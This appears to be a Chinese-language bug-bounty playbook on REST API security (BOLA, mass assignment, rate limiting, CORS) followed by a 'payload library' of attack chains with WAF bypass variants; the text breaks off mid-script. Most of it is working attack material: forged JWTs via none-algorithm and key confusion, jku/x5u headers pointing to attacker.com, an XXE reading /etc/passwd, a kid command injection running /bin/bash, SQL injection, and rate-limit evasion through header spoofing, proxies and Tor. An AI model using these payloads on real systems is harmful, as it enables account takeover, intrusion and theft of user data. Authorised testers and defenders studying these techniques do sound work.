# REST API 安全（BOLA / Mass Assignment / 速率 / CORS）

> 视角：黑盒，针对 REST/JSON API 的常见缺陷

## 1. 一句话说清

REST API 漏洞 = 把"端点 + JSON 字段"当攻击面。
最常见 4 类：BOLA（IDOR 升级版）、Mass Assignment、速率 / 配额缺失、CORS 配置错。
SRC 价值：BOLA / Mass Assignment 在大厂常见 P1 ($1k–$8k)。

---

## 2. 高频入口点

```
/api/v1/...    /api/v2/...
/api/users/{id}    /api/orders/{id}    /api/messages/{id}
/api/users/{id}/orders     # 嵌套
/api/internal/...           # 不该公开的
/api/admin/...
/api/upload    /api/export    /api/import
```

API 文档：
- `/swagger-ui.html`、`/v2/api-docs`、`/openapi.json`、`/api-docs`
- 移动 APP 抓包（HTTPS 中间人 / objection / Frida）
- 微信小程序 wxapkg 解包后看 request 调用

---

## 3. 探测手法

### 3.1 BOLA / IDOR（OWASP API #1）

```
GET /api/orders/100   Authorization: A → 200 A 的订单
GET /api/orders/200   Authorization: A → 200 B 的订单（漏洞）

# 各种 ID 形态
数字递增：100 → 101 → ...
UUID：可能不可枚举，但仍可能被参数污染（如响应里含 link）
字段 in body：{"order_id":100} 改成 {"order_id":200}
嵌套关系：/users/{你}/orders → /users/{他}/orders
批量参数：?ids=1,2,3,4,5,...,1000
```

### 3.2 Mass Assignment（OWASP API #3）

加额外字段试服务端是否接受：

```json
// 注册接口
POST /api/users
{"username":"hunter","email":"a@b.c","password":"...",
 "is_admin":true,        // 试这个
 "role":"admin",          // 或这个
 "verified":true,
 "balance":1000000,
 "tier":"premium"}

// 更新接口
PATCH /api/users/me
{"is_admin":true}
PATCH /api/orders/123
{"status":"shipped","price":0.01}
```

发现：JSON 自动绑定模型字段时，未做字段白名单。

### 3.3 资源消耗 / 速率（OWASP API #4）

```
1. 登录端点：100 次/分钟无限制 → 撞库
2. 短信验证码：无频率 / 无图形验证 → 短信轰炸
3. 列表端点：?per_page=10000 → 性能 DoS
4. 文件上传：无大小限制 → 磁盘耗尽
5. 复杂查询：?filter=深度嵌套 → 查询超时

测试方法：
for i in {1..50}; do curl -I https://target/api/login; done | grep "HTTP"
# 50 个连续不被拒 = 速率缺失
```

### 3.4 功能权限（OWASP API #5）

```
# 普通用户调用 admin 端点
DELETE /api/admin/users/1   Authorization: 普通用户 token
→ 200 = 垂直越权

# 隐藏管理参数
GET /api/users/me?admin_view=true
GET /api/orders/100?include_audit_log=1

# Method 越权
GET 拦 → 试 POST/PUT/PATCH/OPTIONS

# 协议升级
HTTP → HTTPS-only 绕过：试 HTTP 是否仍可访问敏感端点
```

### 3.5 CORS 配置错

```bash
# 1. 检查 CORS 头
curl -H "Origin: https://attacker.com" -I https://target/api/me

# 危险组合
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true     ← 危险（虽然 spec 不允许 * + credentials）

Access-Control-Allow-Origin: https://attacker.com    ← 任意 Origin 接受
Access-Control-Allow-Credentials: true

# 2. null Origin（沙盒 iframe / data: / file:）
curl -H "Origin: null" https://target/api/me

# 3. 子域 / 前缀匹配
Origin: https://attacker.target.com    ← 如果接受 *.target.com
Origin: https://target.com.attacker.com
```

### 3.6 错误处理 / 信息泄露

```
?id=null     ?id=[]    ?id={"$gt":0}   ?id=NaN

→ 看响应是否含堆栈、SQL 错误、内部路径
```

### 3.7 GraphQL 见 `playbooks/graphql.md`

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| Authorization 必填 | 试 Cookie 鉴权 / 试公开端点变体 |
| 后端只信 Authorization 不验内容 | 修改 JWT payload（见 `oauth-saml-jwt.md`） |
| API 文档不公开 | swagger / openapi / 抓 mobile / 解包小程序 |
| `is_admin` 字段拦 | 试 `isAdmin` / `admin` / `role:1` / `level:99` |
| 速率限制 | 多 IP / X-Forwarded-For 注入 / 多 token |
| CORS 严格 | 找 trusted 子域的 XSS / 开放重定向，再投毒 |

---

## 5. 利用提权 / 横向

```
BOLA → 拿大批用户数据
Mass Assignment（注册时设 is_admin） → admin 权限 → 后台
速率缺失（短信） → 短信轰炸 → 业务费用 / 用户骚扰
CORS + cookie 鉴权 → 跨域偷数据
```

---

## 6. 真实案例指纹

通用指纹：
- API 响应含字段 `is_admin`、`role`、`verified`、`balance` → 试反向 set
- 注册请求 body 包含 `role: "user"` → 改成 `role: "admin"` 试
- 列表端点 `per_page` 无上限 → DoS
- `Access-Control-Allow-Origin` reflect 任何 Origin → CORS 漏洞

---

## 7. 复现 / 证据要点

### 7.1 BOLA

```http
# 基线（账号 A 看自己）
GET /api/v1/orders/A_OWN_ID    Authorization: Bearer A_TOKEN
→ 200, A 数据

# 漏洞（账号 A 看 B）
GET /api/v1/orders/B_OWN_ID    Authorization: Bearer A_TOKEN
→ 200, B 数据（脱敏样本）
```

### 7.2 Mass Assignment

```http
POST /api/v1/users
Content-Type: application/json
Body: {"username":"hunter","password":"x","email":"a@b.c","is_admin":true}

→ 201 Created, response 含 "is_admin":true

# 立即用新账号验证
GET /api/v1/admin/dashboard   Authorization: Bearer NEW_TOKEN
→ 200 admin 内容
```

### 7.3 CVSS

```
BOLA → 大量 PII             = 6.5–8.1
Mass Assignment → admin    = 8.8–9.8
速率缺失 → 撞库             = 7.5
速率缺失 → 短信轰炸          = 5.3–7.5
CORS + credentials          = 7.5–8.1
```

### 7.4 影响段

```
GET /api/v1/orders/{id} 接口未校验资源所有权，账号 A 可读取账号 B 的订单。
我已用研究员控制的两个测试账号验证了 IDOR；并用 1 个随机 ID 证明可遍历，
样本仅取 1 条且全部脱敏。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__graphql_introspect` | graphql | 资产展开 / 找隐藏 mutation 与未声明字段 |
| `mcp__jshook__graphql_extract_queries` + `mcp__jshook__graphql_replay` | graphql | 从抓包提取业务查询并重放(改变量) |
| `mcp__jshook__api_probe_batch` | workflow | 批量探测 BOLA / 权限差异(单 fetch burst) |
| `mcp__jshook__ws_monitor` + `mcp__jshook__ws_get_connections` | streaming | WebSocket 帧捕获 / 实时业务接口 |
| `mcp__jshook__protobuf_decode_raw` | encoding | 无 schema 时盲解 protobuf 请求 / 响应 |

完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：通过 Mass Assignment 创建 admin 后实际使用管理员权限。仅证明 token 有 admin。
- **禁**：BOLA 批量遍历超过 10 条样本。
- **禁**：用速率漏洞实际发短信 100 条到他人手机。最多发到自己手机 10 条。
- **禁**：用 CORS 漏洞做真实跨域 PoC（让朋友访问 attacker.com）。自己浏览器自演。


## Payload 库

_15 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

**类别分布：** API安全 (12) · WebSocket安全 (3)

### · API安全

### JWT安全漏洞  `jwt-security`
JSON Web Token安全漏洞利用
子类：**JWT** · tags: `jwt` `token` `authentication`

**前置条件：** 使用JWT进行认证；JWT配置或验证存在问题

**攻击链：**

**1. 1. 解码JWT**
_解码JWT内容_
```
JWT格式: header.payload.signature
解码:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
或使用jwt.io
```

**2. 2. None算法攻击**
_使用None算法绕过签名验证_
```
修改header为:
{"alg":"none","typ":"JWT"}
Base64编码后构造:
HEADER.PAYLOAD.
(签名部分为空)
```

**3. 3. 弱密钥破解**
_破解弱密钥_
```
使用hashcat破解:
hashcat -m 16500 jwt.txt wordlist.txt
使用jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
```

**4. 4. 密钥混淆攻击**
_算法混淆攻击_
```
将RS256算法改为HS256:
{"alg":"HS256","typ":"JWT"}
使用公钥作为HMAC密钥签名
```

**5. 5. 修改Payload**
_修改JWT声明_
```
修改payload中的用户信息:
{"sub":"admin","iat":1234567890}
重新编码并使用已知密钥签名
```

**WAF/EDR 绕过变体：**

**1. JWK/JKU头部注入**
_通过在JWT Header中注入jwk(内嵌密钥)或jku(远程密钥集URL)指向攻击者控制的密钥，使服务端使用攻击者密钥验证签名_
```
# JWK内嵌公钥注入:
# 在JWT Header中嵌入攻击者的公钥:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# 服务端使用Header中的JWK验证签名

# JKU远程密钥集注入:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# 服务端从攻击者控制的URL获取密钥
```

**2. x5c证书链注入**
_通过x5c头部注入攻击者自签证书链，使服务端从证书中提取公钥进行验证，攻击者用对应私钥签名即可伪造任意JWT_
```
# 生成自签名证书:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# 构造JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# 用攻击者私钥签名，x5c中放入攻击者证书
# 服务端从x5c提取公钥验证签名，攻击者自签即可通过

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

---

### GraphQL注入攻击  `graphql-injection`
GraphQL API注入与信息泄露攻击
子类：**GraphQL** · tags: `graphql` `api` `injection` `introspection`

**前置条件：** 目标使用GraphQL API；存在未授权访问或注入点

**攻击链：**

**1. 1. 探测GraphQL端点**
_探测GraphQL端点_
```
# 常见GraphQL端点
/graphql
/api/graphql
/graphql/api
/query
/graphql.php

# 发送POST请求
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

**2. 2. 内省查询**
_执行内省查询获取API结构_
```
# 完整内省查询
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# 使用工具
gqlscan -u http://target.com/graphql
inql -t http://target.com/graphql
```

**3. 3. 批量查询攻击**
_使用批量查询绕过限制_
```
# 别名批量查询
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
}

# 批量查询绕过速率限制
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```

**4. 4. SQL注入**
_GraphQL中的SQL注入_
```
# GraphQL中的SQL注入
{
  user(name: "admin' OR '1'='1") {
    id
    name
    password
  }
}

# 通过参数注入
mutation {
  createUser(input: {
    name: "test' OR 1=1--"
  }) {
    id
  }
}
```

**5. 5. NoSQL注入**
_GraphQL中的NoSQL注入_
```
# MongoDB注入
{
  user(filter: {
    $or: [{name: "admin"}, {name: "root"}]
  }) {
    name
    password
  }
}

# 通过JSON注入
{
  search(text: "{\"$ne\": \"\"}") {
    results
  }
}
```

**6. 6. 信息泄露**
_获取隐藏字段和敏感信息_
```
# 获取隐藏字段
{
  user(id: 1) {
    name
    email
    password
    apiKey
    secretKey
    token
    __typename
  }
}

# 枚举所有可能字段
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

**WAF/EDR 绕过变体：**

**1. 字段建议绕过**
_利用字段建议和片段枚举_
```
# 利用字段建议功能
query {
  userr(id: 1) { name }
}
# 返回: Did you mean "user"?

# 枚举隐藏字段
query {
  user(id: 1) {
    __typename
    ...on AdminUser {
      adminSecret
    }
  }
}
```

**2. 指令注入**
_使用GraphQL指令绕过_
```
# 使用指令绕过
query {
  user(id: 1) @deprecated {
    name
  }
}

# 自定义指令攻击
mutation @skip(if: false) {
  deleteUser(id: 1)
}
```

---

### GraphQL内省攻击  `graphql-introspection`
利用GraphQL内省功能获取API结构
子类：**GraphQL内省** · tags: `graphql` `introspection` `enumeration` `api`

**前置条件：** 目标使用GraphQL；内省功能未禁用

**攻击链：**

**1. 1. 基础内省**
_基础内省查询_
```
# 获取所有类型
{
  __schema {
    types {
      name
    }
  }
}

# 获取查询类型
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

**2. 2. 完整内省**
_完整内省查询获取所有信息_
```
# 获取完整API结构
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```

**3. 3. 使用工具分析**
_使用工具分析GraphQL_
```
# GraphQL Voyager - 可视化分析
# https://github.com/APIs-guru/graphql-voyager

# 使用CLI工具
npm install -g graphql-cli
graphql-cli introspect http://target.com/graphql

# InQL扫描
pip install inql
inql -t http://target.com/graphql

# GraphQL Cop
npm install -g graphql-cop
graphql-cop -t http://target.com/graphql
```

**WAF/EDR 绕过变体：**

**1. 绕过内省禁用**
_绕过内省禁用检测_
```
# 某些实现只检查特定字符串
# 尝试不同格式
query { __schema { types { name } } }
query IntrospectionQuery { __schema { types { name } } }
{"query":"{__schema{types{name}}}"

# 使用GET请求
curl "http://target.com/graphql?query={__schema{types{name}}}"
```

---

### GraphQL批量查询攻击  `graphql-batching`
利用GraphQL批量查询绕过速率限制
子类：**GraphQL批量查询** · tags: `graphql` `batching` `rate-limit` `bypass`

**前置条件：** 目标使用GraphQL；存在速率限制

**攻击链：**

**1. 1. 别名批量查询**
_使用别名批量查询_
```
# 使用别名一次查询多个用户
query {
  user1: user(id: 1) { name email password }
  user2: user(id: 2) { name email password }
  user3: user(id: 3) { name email password }
  user4: user(id: 4) { name email password }
  user5: user(id: 5) { name email password }
}

# 批量枚举
query {
  users: allUsers(limit: 1000) { id name email }
}
```

**2. 2. 数组批量查询**
_使用数组批量查询_
```
# 发送多个查询数组
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"},
  {"query": "{ user(id: 4) { name } }"}
]

# 使用curl发送
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
```

**3. 3. 暴力破解**
_批量暴力破解_
```
# 批量密码尝试
mutation {
  attempt1: login(email: "admin@test.com", password: "password1") { token }
  attempt2: login(email: "admin@test.com", password: "password2") { token }
  attempt3: login(email: "admin@test.com", password: "password3") { token }
  attempt4: login(email: "admin@test.com", password: "password4") { token }
  attempt5: login(email: "admin@test.com", password: "password5") { token }
}

# 枚举用户
query {
  check1: userExists(email: "admin@test.com")
  check2: userExists(email: "root@test.com")
  check3: userExists(email: "test@test.com")
}
```

**WAF/EDR 绕过变体：**

**1. 绕过批量限制**
_绕过批量查询限制_
```
# 分散查询
# 使用不同的查询格式
query BatchQuery {
  user1: user(id: 1) { ...UserFields }
  user2: user(id: 2) { ...UserFields }
}
fragment UserFields on User {
  name
  email
}

# 使用变量批量
query GetUser($ids: [ID!]!) {
  users(ids: $ids) {
    name
    email
  }
}
```

---

### REST API安全测试  `rest-api-security`
REST API安全测试与漏洞利用
子类：**REST API** · tags: `rest` `api` `security` `testing`

**前置条件：** 目标使用REST API；了解API端点

**攻击链：**

**1. 1. API端点发现**
_发现API端点_
```
# 常见API端点
/api/v1/users
/api/v2/products
/api/docs
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/redoc

# 使用工具发现
ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt
wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
```

**2. 2. 认证测试**
_测试API认证_
```
# 测试未授权访问
curl http://target.com/api/v1/users

# 测试JWT
curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users

# 测试API Key
curl -H "X-API-Key: key123" http://target.com/api/v1/users

# 测试Basic Auth
curl -u user:pass http://target.com/api/v1/users
```

**3. 3. HTTP方法测试**
_测试HTTP方法_
```
# 测试允许的HTTP方法
curl -X OPTIONS http://target.com/api/v1/users -v

# 尝试PUT修改
curl -X PUT -H "Content-Type: application/json" \
  -d '{"name":"hacked"}' http://target.com/api/v1/users/1

# 尝试DELETE删除
curl -X DELETE http://target.com/api/v1/users/1

# 尝试PATCH部分更新
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/v1/users/1
```

**4. 4. 参数污染**
_测试参数污染_
```
# 参数污染测试
# 重复参数
/api/users?id=1&id=2
/api/users?name=admin&name=user

# 数组参数
/api/users?id[]=1&id[]=2
/api/users?name[0]=admin&name[1]=user

# JSON注入
/api/users?filter={"role":"admin"}
/api/users?sort=role&order=desc; SELECT SLEEP(5)--
```

**5. 5. 内容类型测试**
_测试内容类型处理_
```
# 测试不同Content-Type
curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users

# XML外部实体
curl -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
  http://target.com/api/users
```

**WAF/EDR 绕过变体：**

**1. API版本绕过**
_使用不同API版本绕过_
```
# 尝试不同API版本
/api/v1/users  # 可能已修复
/api/v2/users  # 可能未修复
/api/users     # 旧版本可能无保护

# 尝试内部API
/internal/api/users
/private/api/users
/_api/users
```

**2. 编码绕过**
_使用编码绕过_
```
# URL编码
curl http://target.com/api/users/%31  # /users/1

# Unicode编码
curl http://target.com/api/users/%u0031

# 双重URL编码
curl http://target.com/api/users/%2531
```

---

### JWT None算法攻击  `jwt-none-alg`
利用JWT None算法绕过签名验证
子类：**JWT安全** · tags: `jwt` `none` `algorithm` `bypass`

**前置条件：** 目标使用JWT认证；服务器未正确验证算法

**攻击链：**

**1. 1. 解码JWT**
_解码JWT令牌_
```
# 在线解码
https://jwt.io

# 使用命令行
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d

# 使用Python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
```

**2. 2. 构造None算法Token**
_构造None算法Token_
```
# 修改头部为none算法
# 原始头部
{"alg":"HS256","typ":"JWT"}

# 修改为
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# 使用Python构造
import base64, json
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","iat":1516239022}
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."
print(token)
```

**3. 3. 修改用户权限**
_修改用户权限_
```
# 修改payload提权
# 原始payload
{"sub":"user","role":"user","iat":1516239022}

# 修改为
{"sub":"admin","role":"admin","iat":1516239022}

# 完整攻击
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
token = header + "." + payload + "."
print(token)
```

**4. 4. 发送恶意Token**
_发送恶意Token_
```
# 使用curl发送
curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin

# 空签名测试
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
```

**WAF/EDR 绕过变体：**

**1. 算法混淆**
_尝试算法变体_
```
# 尝试不同变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# 移除alg字段
{"typ":"JWT"}
```

**2. 签名绕过**
_签名绕过变体_
```
# 空签名
header.payload.

# 任意签名
header.payload.anysignature

# 使用原始签名
# 某些库会忽略签名验证
```

---

### JWT密钥混淆攻击  `jwt-key-confusion`
利用JWT算法混淆实现签名绕过
子类：**JWT安全** · tags: `jwt` `algorithm` `confusion` `rs256`

**前置条件：** 目标使用RS256算法；可获取公钥

**攻击链：**

**1. 1. 获取公钥**
_获取JWT公钥_
```
# 从证书获取
curl -k https://target.com/.well-known/jwks.json

# 从SSL证书获取
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# 从JWT头部获取
# 解码JWT头部，查找x5c或jku字段

# 常见公钥位置
/.well-known/jwks.json
/api/keys
/public.key
/pubkey.pem
```

**2. 2. 算法混淆攻击**
_算法混淆攻击_
```
# 将RS256改为HS256
# 使用公钥作为HMAC密钥

import jwt
import base64

# 获取公钥
public_key = open("public.pem").read()

# 构造payload
payload = {"sub":"admin","role":"admin"}

# 使用公钥作为HMAC密钥签名
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

**3. 3. 发送恶意Token**
_发送恶意Token_
```
# 使用构造的Token
curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin

# Python脚本
import requests
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://target.com/api/admin", headers=headers)
print(response.text)
```

**WAF/EDR 绕过变体：**

**1. kid注入**
_通过kid参数注入_
```
# kid参数注入
# 修改JWT头部kid字段
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}

# SQL注入kid
{"alg":"HS256","typ":"JWT","kid":"key UNION SELECT secret--"}

# 命令注入kid
{"alg":"HS256","typ":"JWT","kid":"|/bin/bash -c id"}
```

**2. jku/x5u绕过**
_通过jku/x5u绕过_
```
# jku指向攻击者服务器
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}

# x5u指向攻击者证书
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# 在攻击者服务器托管恶意密钥
```

---

### IDOR不安全的直接对象引用  `api-idor`
利用IDOR漏洞访问未授权资源
子类：**IDOR** · tags: `idor` `api` `authorization` `bypass`

**前置条件：** 目标使用ID引用资源；存在授权检查缺陷

**攻击链：**

**1. 1. 识别ID参数**
_识别ID参数_
```
# 常见ID参数位置
/api/users/123
/api/orders?id=123
/api/documents/abc-123
/api/profile?user_id=123

# 观察响应
# 记录不同ID返回的数据差异
```

**2. 2. 枚举ID**
_枚举ID值_
```
# 数字ID枚举
for i in $(seq 1 1000); do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt
done

# 使用Burp Intruder
# Payload: Numbers 1-10000
# GET /api/users/{id}

# UUID枚举
# 使用ffuf
ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
```

**3. 3. 批量检测**
_批量检测IDOR_
```
# Python脚本批量检测
import requests

token = "YOUR_TOKEN"
for i in range(1, 100):
    r = requests.get(
        f"http://target.com/api/users/{i}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        print(f"ID {i}: {r.json()}")

# 检测数据泄露
# 比较不同用户访问同一ID的响应
```

**4. 4. 跨用户访问**
_跨用户访问测试_
```
# 尝试访问其他用户数据
# 用户A的Token访问用户B的数据

# 修改请求中的ID
GET /api/users/2  # 原本是用户1
GET /api/orders?user_id=2  # 原本是user_id=1

# 修改POST/PUT请求体
{
  "user_id": 2,  # 修改为其他用户ID
  "amount": 1000
}
```

**WAF/EDR 绕过变体：**

**1. ID变体绕过**
_ID变体绕过_
```
# 数字变体
/api/users/001
/api/users/1
/api/users/0x1
/api/users/1.0

# 编码绕过
/api/users/%31  # URL编码
/api/users/MSAg  # Base64编码

# 数组绕过
/api/users?id[]=1&id[]=2
/api/users[0]=1&users[1]=2
```

**2. 参数污染**
_参数污染绕过_
```
# 参数污染
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON注入
{"id": 1, "id": 2}

# 批量操作
/api/users/batch?ids=1,2,3,4,5
```

---

### API速率限制绕过  `api-rate-limit`
绕过API速率限制进行暴力攻击
子类：**速率限制** · tags: `api` `rate-limit` `bypass` `brute-force`

**前置条件：** 目标有速率限制；限制实现有缺陷

**攻击链：**

**1. 1. 检测速率限制**
_检测速率限制_
```
# 快速发送请求检测限制
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test
done

# 观察响应
# 429 Too Many Requests
# 403 Forbidden
# 自定义错误消息
```

**2. 2. IP绕过**
_使用IP头绕过_
```
# X-Forwarded-For绕过
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test

# 其他IP头
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# 自动化
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
done
```

**3. 3. 分布式绕过**
_分布式绕过速率限制_
```
# 使用多个代理
# 配置代理池
proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080"
]

# Python脚本
import requests
proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]
for i, proxy in enumerate(proxies_list):
    requests.get("http://target.com/api/test", proxies={"http": proxy})

# 使用Tor
# 每次请求头换Tor电路
import stem.process
import requests

# 使用云函数
# AWS Lambda, Azure Functions等
```

**4. 4. 其他绕过技术**
_其他绕过技术_
```
# 用户代理绕过
curl -A "Googlebot" http://target.com/api/test
curl -A "Bingbot" http://target.com/api/test

# 认证绕过
# 使用不同账户
for token in $TOKENS; do
  curl -H "Authorization: Bearer $token" http://target.com/api/test
done

# HTTP/2多路复用
# 单个连接发送多个请求

# 缓慢请求
# Slowloris攻击
```

**WAF/EDR 绕过变体：**

**1. API Key轮换**
_API Key轮换_
```
# 使用多个API Key
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumerate(api_keys):
    requests.get("http://target.com/api/test", headers={"X-API-Key": key})

# 注册多个账户获取多个Token
```

**2. 请求分散**
_请求分散_
```
# 添加延迟
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.sleep(0.5)  # 每次请求头隔0.5秒

# 分散到不同时间段
# 使用定时任务分散请求
```

---

### 批量赋值漏洞  `api-mass-assignment`
利用批量赋值漏洞修改敏感字段
子类：**批量赋值** · tags: `api` `mass-assignment` `privilege-escalation`

**前置条件：** API接受JSON输入；存在未过滤的字段

**攻击链：**

**1. 1. 识别输入字段**
_识别返回的字段_
```
# 正常请求
POST /api/users
{
  "name": "test",
  "email": "test@test.com"
}

# 观察响应
{
  "id": 1,
  "name": "test",
  "email": "test@test.com",
  "role": "user",
  "isAdmin": false,
  "createdAt": "2024-01-01"
}
```

**2. 2. 添加敏感字段**
_添加敏感字段_
```
# 尝试添加role字段
POST /api/users
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin"
}

# 尝试isAdmin
{
  "name": "test",
  "email": "test@test.com",
  "isAdmin": true
}

# 尝试多个字段
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["read", "write", "delete"]
}
```

**3. 3. 更新操作**
_更新操作测试_
```
# PUT/PATCH更新
PATCH /api/users/123
{
  "role": "admin"
}

# 尝试修改其他用户
PATCH /api/users/1
{
  "role": "admin"
}

# 尝试修改密码
PATCH /api/users/me
{
  "password": "newpassword123"
}
```

**4. 4. 嵌套对象**
_嵌套对象测试_
```
# 嵌套对象赋值
{
  "name": "test",
  "settings": {
    "notifications": true,
    "isAdmin": true
  }
}

# 数组赋值
{
  "name": "test",
  "roles": ["admin", "superadmin"]
}
```

**WAF/EDR 绕过变体：**

**1. 字段变体**
_尝试字段变体_
```
# 尝试不同字段名
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userType, user_type_id

# 尝试内部字段
__v, _id, created_at, updated_at
password_hash, passwordHash
```

**2. 类型混淆**
_类型混淆测试_
```
# 数字转布尔
{"isAdmin": 1}
{"isAdmin": "true"}

# 数组转字符串
{"roles": "admin"}

# 对象转数组
{"settings": ["admin"]}
```

---

### BOLA破坏对象级授权  `api-bola`
利用BOLA漏洞访问未授权对象
子类：**BOLA** · tags: `api` `bola` `authorization` `idor`

**前置条件：** API使用对象ID；授权检查缺陷

**攻击链：**

**1. 1. 识别对象访问**
_识别对象访问模式_
```
# 观察API端点
GET /api/users/{user_id}/documents
GET /api/teams/{team_id}/members
GET /api/orders/{order_id}

# 分析对象关系
# 用户 -> 文档
# 团队 -> 成员
# 订单 -> 用户
```

**2. 2. 测试授权**
_测试授权检查_
```
# 创建两个账户测试
# 用户A: user_a_token
# 用户B: user_b_token

# 用户A创建资源
POST /api/documents
Authorization: Bearer user_a_token
{"title": "Secret Doc"}
# 返回: {"id": "doc_123"}

# 用户B尝试访问
GET /api/documents/doc_123
Authorization: Bearer user_b_token
# 如果返回200，存在BOLA
```

**3. 3. 横向访问**
_横向访问测试_
```
# 枚举其他用户资源
for doc_id in doc_1 doc_2 doc_3; do
